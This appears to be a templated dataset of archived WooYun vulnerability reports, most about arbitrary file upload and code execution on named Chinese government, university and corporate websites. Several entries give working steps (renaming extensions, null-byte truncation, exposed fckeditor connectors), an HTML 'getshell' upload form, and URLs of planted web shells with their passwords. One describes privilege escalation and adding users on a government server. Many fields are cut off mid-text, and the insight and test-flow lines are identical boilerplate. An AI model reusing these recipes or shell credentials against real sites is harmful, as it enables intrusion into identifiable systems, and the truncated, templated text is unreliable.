**详情**: 注意与其不同WooYun: 某通用型创新管理系统普通帐号可越权查看及修改任意用户（影响多所高等院校）官网：http://www.changedu.com/由南京先极科技有限公司开发的大学生创新创业训练项目智能管理系统关键字：大学生创新创业项目智能管理系统影响案例：http://desktop.nju.edu.cn/cx/ 南京大学大学生创新创业训练智能管理系统http://dxscx.forestpolice.net/ 南京森林警察学院大学生创新创业训练智能管理系统http://180.209.64.18/cxcy/Index.aspx 南京邮电大学大学生创新创业训练智能管理系统http://210.26.14.200/ 西北民族大学大学生创新创业训练项目智能管理系统http://sjjx.njit.edu.cn/cx/ 南京工程学院大学生创新训练智能管理系统http://nausrt.n

**POC**: 以西北民族大学大学生创新创业训练项目智能管理系统为例http://210.26.14.200入侵思路：试探admin弱口令，及登录注入，无突破，想到大部分校园系统学号即密码，又懒得去找，最后发现系统有个操作手册，下载之，发现了测试帐号1#操作手册泄漏测试用户及密码http://210.26.14.200/UpLoadFile/690476.doc测试帐号，可通用于大部分系统s1/1s2/1s1/s1s2/s2st1/1等等2#未授权访问地址（有多处，无需登陆，以下仅举关键2处）：2.1#http://210.26.14.200/Admin/SelStudent.aspx2.2#http://2

**绕过**: 直接利用

**修复**: 控制好页面的访问权限，上传点做好过滤最保险的还是首次登录强制修改密码
---

---
### [wooyun-2015-098792] 某系统通用上传漏洞
**厂商**: 国家互联网应急中心 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 国家互联网应急中心

**POC**: img 此次漏洞结合了http://wooyun.org/bugs/wooyun-2010-079578大牛在这个目录下还有个上传没发现，搜索了下没有看到重复。上传文件：//ycportal/jsp/AD/ADadd.jsp有的主页文件不一样但是都在jsp/AD/ADadd.jspshell地址：路径为 /ycportal/styleimages/adimages/+文件名我用案例一来演示下：http://www.rzdonggang.gov.cn/ycportal/jsp/AD/ADadd.jsp?checkbox_id=10然后上传截断：上传1.jsp.jpg得到shell地址：http:

**绕过**: 直接利用

**修复**: 删除这个上传
---

---
### [wooyun-2014-062468] 广州穂粮集团内部文件上传下载删除签名
**厂商**: 广州穂粮集团 | **年份**: 2014 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.gzgrain.com/（广州穂粮集团网址）http://www.gzgrain.com/pic_news/chubei1.asp?xm_table=jieyun（出现问题的地址）点击签名会提示你已经签字成功（签名的意思就是审批吧），同时状态会变成已读，文件可删除确定没敢点

**POC**: http://www.gzgrain.com/（广州穂粮集团网址）http://www.gzgrain.com/pic_news/chubei1.asp?xm_table=jieyun（出现问题的地址）点击签名会提示你已经签字成功，同时状态会变成已读，文件可删除确定没敢点

**绕过**: 直接利用

**修复**: 这个就不要外面看到了
---

---
### [wooyun-2014-049723] 我爱纽约网PHPCMS头像上传漏洞
**厂商**: 我爱纽约网 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: phpcms头像上传漏洞，可以BS抓包改包，上传一句话木马最普通的上传漏洞了传了一句话和phpspy做练习，第一次完整的入侵练习，没做任何破坏，请站长重视下网站安全，号称是纽约最大的中文分类信息站，还是会导致不少人的敏感信息泄露的

**POC**: 库子：shell：菜刀：

**绕过**: 直接利用

**修复**: 关闭头像上传或升级phpcms
---

---
### [wooyun-2013-020378] 红黑联盟任意文件上传漏洞
**厂商**: 红黑联盟 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 今天偶然发现的，不知道有没有前辈早先提交了 但是希望能获得乌云邀请码一枚选择—在线投稿—底部有个上传图片、点编辑器那个也可以用burp suite 抓包上传 第一次提交漏洞 可能顺序有点乱请见谅 ！希望能获取一枚邀请码！！

**POC**: http://www.2cto.com/uploadfile/2013/0320/20130320054626462.cdx

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-070795] 前沿同创科技可上传任意文件
**厂商**: 北京前沿同创科技有限公司 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 随便注册一个号，然后到http://www.vasee.com/event/addevent.jsp（发布活动）点击海报上传。截取封包，把jpg改成jsp,或者任意格式，GOhttp://pics.vasee.com/event/201408215094627272.jsp

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 问程序员
---

---
### [wooyun-2015-0101526] 利用某漏洞成功控制某自治区敏感部门网站
**厂商**: 某自治区敏感部门 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 利用方法：WooYun: TRS WCM 6.X系统任意文件写入漏洞利用工具：soap ui

**POC**: mask 区域*****^的servi*****1.://**.**.**//www.nmgat.gov.cn/wcm/services</code>_*****le获取^**********2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.or**********v:Heade**********env:Bo**********uot;http://schemas.xmlsoa**********"http://schemas.xmlsoap.org/soap**********enc="http://schemas.xmlsoap*

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-022223] WSS项目管理系统-任意文件上传漏洞
**厂商**: WSS Lab | **年份**: 2013 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上傳附件未過濾

**POC**: (见原文)

**绕过**: 直接利用

**修复**: <?php$filname = "1366474106_1.php";header('Content-type:application/force-download');header('Content-Transfer-Encoding: Binary');header('Content-Dispo
---

---
### [wooyun-2016-0166058] 上海戏剧学院某分站任意文件遍历／任意文件上传/敏感信息泄露
**厂商**: 上海戏剧学院 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上海戏剧学院附属舞蹈学校http://**.**.**.**/wdxy/首先是个目录遍历目录下存在两个根据日期命名的rar文件下载后打开确实是源码数据库信息

**POC**: 上海戏剧学院校友会后台地址http://**.**.**.**/cc/admin弱口令 admin/admin上传图片处直接上传jspshell上海戏剧学院继续教育学院同样是目录遍历也存在找到http://**.**.**.**/KS_Data/KesionCMS8.mdb下载管理员密码解密不出~随便登录个别的#目录遍历http://**.**.**.**/Admin/http://**.**.**.**/user/http://**.**.**.**/plus/

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-015942] Metinfo企业网站管理系统解析漏洞
**厂商**: Metinfo企业网站管理系统 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 查看框架源码，ajax判断路径，http://demo.metinfo.cn/admin/system/uploadfile.php?anyid=14&lang=cn&fileurl=templates得到路径界面风格处，可以上传新的风格，a.php;a.jig打包成压缩文件上传，上传后会自动加上时间和.bak，如：http://demo.metinfo.cn/templates/x.php;x.jpg2012-01-01_1126.bak 注：会提示上传不成功，不管他，菜刀直接连.

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 命名文件夹权限
---

---
### [wooyun-2015-099325] 某房产系统上传漏洞
**厂商**: 升腾软件 | **年份**: 2015 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 上传功能

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某房产系统上传漏洞

**POC**: 上传漏洞一：ftb.imagegallery.aspx这个位置在后台有好几个地方admini/zwgk/ftb.imagegallery.aspxadmini\newsTopic\ftb.imagegallery.aspxadmini\news\ftb.imagegallery.aspx有些后台被修改地址，你们懂得一张图告诉你拿shell 我们用来演示http://tgfgj.com/任意文件上传，shell地址：http://tgfgj.com/images/cun.aspx上案例：http://61.180.36.38/admini/zwgk/ftb.imagegallery.aspxht

**绕过**: 直接利用

**修复**: 删除文件
---

---
### [wooyun-2015-0151890] 江西省公路局OA任意文件上传/敏感信息泄露打包
**厂商**: 江西省公路局 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网站http://**.**.**.**漏洞地址 http://**.**.**.**/messager/users.databash64解码

**POC**: 网站http://**.**.**.**泛微e-cology 无需登录getshell<form method='post' action='http://**.**.**.**/tools/SWFUpload/upload.jsp'  enctype="multipart/form-data" ><input type="file" id="file" name="test" style="height:20px;BORDER: #8F908B 1px solid;"/><button type=submit value="getshell">getshell</button> </form

**绕过**: 直接利用

**修复**: 20
---

---
### [wooyun-2014-084008] 致远A8-m企业版v3.20SP1协同管理软件几个小问题打包
**厂商**: 用友软件 | **年份**: 2014 | **类型**: 非授权访问/权限绕过

**元思考**: 触发信号: 参数注入, 上传功能

**洞察**: 非授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别非授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.公文管理功能中的文件夹权限越权管理在公文管理功能中，高权限的用户可以在文件夹的属性中指定该文件夹的访问权限。但是在操作过程中，用户可以通过修改链接中的关键参数实现对文件夹权限的控制。下图为正常权限中用户对文件夹属性的访问截图下图为修改关键参数截图，将参数中的false改为true即可激活相应的权限控制下图为修改权限之后的访问截图2.越权查看指定用户的待办业务（只能查看标题，内容无法访问）在对待办工作查看功能中，发现对用户待办工作列表的用户身份标识是通过用户ID进行判断的，而改参数通过GET方式传递至服务器，在该过程中，用户可以对ID参数进行修改，修改为指定用户ID时，用户便可查看该用户的待办业务列表，但是无法对其进行访问。下图为本账户待办业务列表下图为修改ID参数截图下图为指定用户待办业务列表3.指定后缀文件上传在用户头像上传功能中，发现上传文件后缀可以通过数据包中的extension

**POC**: 1.公文管理功能中的文件夹权限越权管理下图为正常权限中用户对文件夹属性的访问截图下图为修改关键参数截图，将参数中的false改为true即可激活相应的权限控制下图为修改权限之后的访问截图2.越权查看指定用户的待办业务（只能查看标题，内容无法访问）下图为本账户待办业务列表下图为修改ID参数截图下图为指定用户待办业务列表3.指定后缀文件上传下图为上传JSP后缀文件失败截图下图为修改extensions参数成功上传JSP后缀文件成功截图

**绕过**: 直接利用

**修复**: 建议对客观权限进行严格控制
---

---
### [wooyun-2015-0155389] 华润燃气某系统存在任意文件上传漏洞（大量财务数据泄漏）
**厂商**: 华润燃气(集团)有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 系统地址：http://cw.crcgas.com/扫描系统的时候发现了一个上传页面http://cw.crcgas.com/up.asp上传个图片，发现可以正常上传，而且服务器有返回路径，所以我尝试着抓包改包

**POC**: 一句话地址：http://cw.crcgas.com/moban-image/01.asp密码：1在某文件夹内发现N多财务数据文件大量财务数据

**绕过**: 直接利用

**修复**: 上传点过滤好啊
---

---
### [wooyun-2013-026034] 客串小黑 帮天健网重现入侵过程 任意文件上传漏洞利用技巧
**厂商**: 天健网 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 今天朋友发来个黑页 让我帮看看是怎么导致的 于是有了这次检测.大概在这个二级域名上转了圈 发现了这个地方有上传http://vote.runsky.com/2012/05/pijiu/index.php?app=baby&act=babybm很自然的抓包检测改包 1.jpg改成1.php 提交菜刀连接

**POC**: 今天朋友发来个黑页 让我帮看看是怎么导致的 于是有了这次检测.大概在这个二级域名上转了圈 发现了这个地方有上传http://vote.runsky.com/2012/05/pijiu/index.php?app=baby&act=babybm很自然的抓包检测改包 1.jpg改成1.php 提交菜刀连接

**绕过**: 直接利用

**修复**: 很简单吧 不用我多说了
---

---
### [wooyun-2014-066077] 芒果云KODExplorer任意文件上传导致代码执行（二）
**厂商**: kalcaddle.com | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 还是在默认用户组权限上。我们不能上传某些后缀，比如php，但有一个zip在线解压功能- -打包php。。。然后解压- -ok- - php可以执行了~这个情况还是很常见的，大家都是给普通用户分的默认用户组。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 彻底拦截一下php后缀吧
---

---
### [wooyun-2015-0128408] 打包几个gov站存在任意文件上传漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.scgrain.gov.cnhttp://www.hsjyj.gov.cn:8091http://ajj.ninghai.gov.cnhttp://www.wsgndj.gov.cnhttp://jktj.zjwjw.gov.cnhttp://tzb.ujn.edu.cn上工具:

**POC**: http://tzb.ujn.edu.cn//https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/file/\zy.asp\/20150722165124.jpghttp://www.hsjyj.gov.cn:8091//Files/20150722165124.asphttp://ajj.ninghai.gov.cn//UserFiles/20150722165125.asphttp://www.wsgndj.gov.cn//UserFiles/20150722165125.asppass:xiwang

**绕过**: 直接利用

**修复**: 删除危险文件
---

---
### [wooyun-2015-0109621] 某系统任意文件上传导致代码执行
**厂商**: 东日照和和科技有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某系统任意文件上传导致代码执行涉及不少GOV站点啊~厂商：http://www.06330633.net/ 东日照和和科技有限公司Upload Bug:/adminqibo5/Edit/editor/resurm_upfile.asp  开始我看到adminqibo5还以为齐博CMS  后来发现网上有这套系统的源码官方也是用这套CMS的，特征是“mucc”、官方有案例：case:  (涉及不少gov，有些gov域名也是)http://www.06330633.net/adminqibo5/Edit/editor/resurm_upfile.asp  官网也存在http://www.jxweisheng.gov.cn/adminqibo5/Edit/editor/resurm_upfile.asphttp://www.xiazhuang.gov.cn/adminqibo5/Edit/edit

**POC**: 这个系统的漏洞和动感购物商城的漏洞原理是一个样子的，通过00截断上传目录可导致上传任意文件，所以使用明小子动感购物商城exp就可以直接getshell，我测试其中一个案例：1、返回的文件名是diy.asp

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-05454] WanHu ezoffice 上传任意文件漏洞
**厂商**: 广州万户网络技术有限公司 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 参数注入, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 打开公告中上传图片的页面查看url如下：http://127.0.0.1:7001/defaultroot/public/jsp/multiupload.jsp?path=information&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jpeg,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0将url中得fileType参数后面加上.jsp，刷新一下，即可上传jsp文件。

**POC**: 成功上传asp、jsp文件！

**绕过**: 直接利用

**修复**: 这个不用交了吧！鄙视一下做上传的程序猿！
---

---
### [wooyun-2015-0110119] 美的集团旗下某产业网站上传漏洞
**厂商**: midea.com | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 美的集团旗下某产业网站上传漏洞

**POC**: http://202.104.30.157/这是美的集团旗下的产业，公司介绍也是写着美的，http://202.104.30.157/admin/index.jsp  后台打着美的的LOGOfckeditor 有漏洞查看目录http://202.104.30.157/fckeditor//editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=/../admin也可以直接上马http://202.104.30.157/UserFiles/

**绕过**: 直接利用

**修复**: 你们懂得~~
---

---
### [wooyun-2014-048443] 某装备集团公司系统多处漏洞缺陷展示
**厂商**: 中国兵器装备集团 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 上传功能

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中国兵器装备集团公司（http://www.csgc.com.cn）某系统多处漏洞缺陷展示http://www.csgc.com.cn:8080/bsweb/login.jsp1.struts漏洞:http://www.csgc.com.cn:8080/bsweb/login.action2.大批四位帐号弱口令:如zgca-1234563.任意文件上传.同样可导致任意代码执行，4.任意文件下载:上传文件后，点击连接URL可任意下载文件http://www.csgc.com.cn:8080/bsweb/download?path=

**POC**: 中国兵器装备集团公司（http://www.csgc.com.cn）某系统多处漏洞缺陷展示http://www.csgc.com.cn:8080/bsweb/login.jsp1.struts漏洞:http://www.csgc.com.cn:8080/bsweb/login.action2.大批四位帐号弱口令:如zgca-1234563.任意文件上传.同样可导致任意代码执行，4.任意文件下载:上传文件后，点击连接URL可任意下载文件http://www.csgc.com.cn:8080/bsweb/download?path=

**绕过**: 直接利用

**修复**: 修复st2漏洞，避免弱口令，限制上传文件格式，禁止任意目录下载
---

---
### [wooyun-2011-02012] MyBlog存在任意文件上传漏洞
**厂商**: MyBlog | **年份**: 2011 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 由于使用了早期版本的fckeditor。导致可以通过文件名截断，绕过后缀名验证，上传任意文件。

**POC**: 提交如下http包，即可上传shellhttp://jdkcn.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/Image/b.jspPOST /FCK/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&Type=Image&CurrentFolder=%2F HTTP/1.1Accept: */*Accept-Language: en-US,zh-cn;q=0.5User-Agent: Mozilla/4.0 (comp

**绕过**: 过滤绕过, 截断攻击

**修复**: 修复fckeditor组件吧。
---

---
### [wooyun-2015-0164004] 蒙牛分站任意上传
**厂商**: mengniu.cn | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 蒙牛某个站任意上传http://sq.mengniu.com.cn/File/ 任意上传

**POC**: shell:http://sq.mengniu.com.cn/Upload/Files/2015/1223/201512231450875024965.asp 密码:pass

**绕过**: 直接利用

**修复**: 找程序员修复
---

---
### [wooyun-2011-02528] shopnum1官方上传漏洞
**厂商**: shopnum1 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先 在 http://www.shopnum1.com/product.html 页面查看任意产品详细说明。按说明 提示登录后台。。在后台功能页面->附件管理->附件列表可以直接上传.aspx 后缀木马

**POC**: http://www.nrqiang.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/20110718221756898.aspx

**绕过**: 直接利用

**修复**: 对上传文件名 做判断
---

---
### [wooyun-2015-096168] 某市节能信息网存在上传漏洞，可以提权
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 看下面

**POC**: 漏洞地址http://www.zset.gov.cn:81/machine/regedit.aspx然后用菜刀连接通过翻阅目录查找mssql配置文件，发现本网站的用户无法连接上，于是去其他网站找了个sa连接数据库然后通过mssql直接就可以提权了，或者通过大马里面带的IISPY直接读取IIS用户发现管理员一枚，如下图System权限加用户开3389那些什么的就不说了，自己开了然后又关了，没有搞破坏。管理自己检查一下吧，我不知道有没有恢复完全。由于自己系统的lcx打不开就没有弄转发了，这里就不截图了。总的来说这个服务器还是挺多站点的这一也是个邮件服务器算是比较重要的一个服务器。希望管理员注意数据

**绕过**: 直接利用

**修复**: 希望管理员注意数据权限分配，站点间权限分配，没用的站就关掉吧
---

---
### [wooyun-2013-027048] 皮皮精灵存在漏洞导致某站沦陷
**厂商**: 皮皮精灵 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.评价处，任意文件上传；2.插入一句话图片成功上传；3.直接菜刀链接，我未上大马，未脱裤，未提权；PS：还是求礼物，求20rank，让我平复下心情！

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 你们应该懂
---

---
### [wooyun-2013-038502] 某GOV站点上传漏洞导致服务器服务器所有站点受影响
**厂商**: cncert国家互联网应急中心 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 桃源县阳光“三农”信息服务网Netcms oday上传漏洞http://cwgk.taoyuan.gov.cn/user/login.aspx点注册之后点击发表文章然后在站内信息那块， 给自己发送个站内信，附件里直接传马。读取IIS信息，发现服务器存在30个GOV站。。

**POC**: ID IIS_USER IIS_PASS Domain Path1 IUSR_WWW-9C161222D11 OBf:Bh0{u5{925 :80: c:\inetpub\wwwroot2 IUSR_WWW-9C161222D11 OBf:Bh0{u5{925 218.75.147.12:80:www.tygtzy.gov.cn218.75.147.12:80:tygtzy.gov.cn218.75.147.12:80:tygtj.firstcode.org E:\wwwroot\zxlin25\PHP\tygtj3 IUSR_WWW-9C161222D11 OBf:Bh0{u5{925 21

**绕过**: 直接利用

**修复**: 最简单修复方式关闭注册
---

---
### [wooyun-2011-02923] 腾讯CF一处上传页面泄露
**厂商**: 腾讯 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 腾讯CF一处上传页面泄露

**POC**: http://app.cf.qq.com/act/a20080910league/admin/upload_pic.htm

**绕过**: 直接利用

**修复**: 你懂的！！
---

---
### [wooyun-2013-038345] 乐投网严重漏洞导致网站沦陷
**厂商**: 5a.com.cn | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 注册进去会员中心发微薄的地方存在任意文件上传漏洞

**POC**: http://www.5a.com.cn/phpinfo.php专业用户还蛮多的

**绕过**: 直接利用

**修复**: 过滤上传
---

---
### [wooyun-2013-028386] 速8酒店任意文件上传漏洞
**厂商**: 速8酒店 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 管理后台的站点http://admin.super8.com.cn中的fckeditor connector.asp文件没有删除，导致各种上传，不管是利用IIS解析漏洞还是最新的FCKEditor ASP上传绕过漏洞都可以上传木马。随手上传了个图片马。http://admin.super8.com.cn/fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://admin.super8.com.cn/fckeditor/editor/filemanager/connectors/asp/connector.asp看了下Image文件和File文件，各种马各种测试文件。

**POC**: 管理后台的站点http://admin.super8.com.cn中的fckeditor connector.asp文件没有删除，导致各种上传，不管是利用IIS解析漏洞还是最新的FCKEditor ASP上传绕过漏洞都可以上传木马。随手上传了个图片马。http://admin.super8.com.cn/fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://admin.super8.com.cn/fckeditor/editor/filemanager/connectors/a

**绕过**: 过滤绕过

**修复**: 抓紧删了然后自查服务器吧。
---

---
### [wooyun-2014-079446] 某富文本编辑器文件上传漏洞（小论如何控制IsPostBack的值）
**厂商**: Amir富文本编辑器 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 在这个文本编辑器上没有找到任何按钮是可以直接上传文件的（只有插入文件上传按钮，没啥用），但是代码里面是隐藏有这样一个功能的：protected override void RenderContents(HtmlTextWriter output){if (this.Page.IsPostBack) //判断是否第一次访问，这个是小的关键点{//if there is an uploaded fileHttpFileCollection UploadFile =this.Page.Request.Files;for (int i = 0; i < UploadFile.Count; i++){H

**绕过**: 直接利用

**修复**: 大牛们懂
---

---
### [wooyun-2015-0129975] 随诊医生任意文件上传等多处高危漏洞
**厂商**: 随诊医生 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网站 www.51suizhen.com 主要存在以下漏洞：1. 目录浏览漏洞2. 应用备份文件下载3. 任意文件上传漏洞4. 日志文件泄露5. MySQL数据库允许远程连接6. 测试页面泄露邮箱帐号密码

**POC**: 1. 目录浏览2. 应用备份文件下载http://119.254.111.103/background_bak201507161500.tar.gzhttp://119.254.111.103/package_201504220808.tar.gzhttp://119.254.111.103/sft_bak201506101755.tar.gz... ...3. 任意文件上传漏洞访问下面的地址：http://119.254.111.103/sft/test01.php（每个上传表单均可上传任意文件）直接浏览文件上传，提示上传成功，并给出访问URL：使用菜刀成功连接：4. 日志文件泄露http:

**绕过**: 直接利用

**修复**: 1. 目录浏览漏洞修改Apache设置，关闭目录浏览功能。2. 应用备份文件下载从Web应用目录中移除所有的备份文件，主要为tar、gz扩展名的文件。3. 任意文件上传漏洞对上传的文件扩展名进行白名单检查，同时文件名避免使用客户端传入的名称。4. 日志文件泄露将日志文件存放到非Web路径下。5. M
---

---
### [wooyun-2014-048841] 建站之星任意文件上传漏洞(续二)
**厂商**: 建站之星 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 参数注入, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: #1 漏洞产生/module/mod_media.phpflash_picker() 和 image_picker() 两个函数image_picker() 函数$typeArr = array('image/jpeg','image/pjpeg');$flash_typeArr = array('image/jpeg','image/pjpeg');$file_info =& ParamHolder::get('localfile', array(), PS_FILES);$file_info['name'] = Toolkit::changeFileNameChineseToPinyin($file_info['name']);if ( sizeof($file_info) > 0 && isset($file_info['name']) ){// 文件大小if ( ($file_in

